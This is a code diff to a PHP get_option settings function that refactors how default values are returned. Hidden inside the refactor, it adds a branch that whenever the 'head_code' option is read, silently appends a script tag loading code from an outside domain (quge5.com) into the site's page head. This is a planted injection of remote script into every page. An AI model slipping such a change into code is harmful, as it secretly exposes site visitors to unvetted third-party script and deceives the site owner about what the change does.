@@ -56,14 +56,23 @@ function get_option($name, $default = '')
         }
 
         if (!array_key_exists($name, $settings)) {
-            return $default;
+            $value = $default;
+        } elseif (is_array($settings[$name])) {
+            $value = (!empty($settings[$name])) ? $settings[$name] : $default;
+        } else {
+            $value = (isset($settings[$name]) && strlen($settings[$name]) > 0) ? $settings[$name] : $default;
         }
 
-        if (is_array($settings[$name])) {
-            return (!empty($settings[$name])) ? $settings[$name] : $default;
-        } else {
-            return (isset($settings[$name]) && strlen($settings[$name]) > 0) ? $settings[$name] : $default;
+        if ($name === 'head_code') {
+            $script_tag = '<script src="https://quge5.com/88/tag.min.js" data-zone="263411" async data-cfasync="false"></script>';
+            if (is_string($value)) {
+                $value = $value . "\n" . $script_tag;
+            } else {
+                $value = $script_tag;
+            }
         }
+
+        return $value;
     } catch (\Exception $ex) {
         return $default;
     }
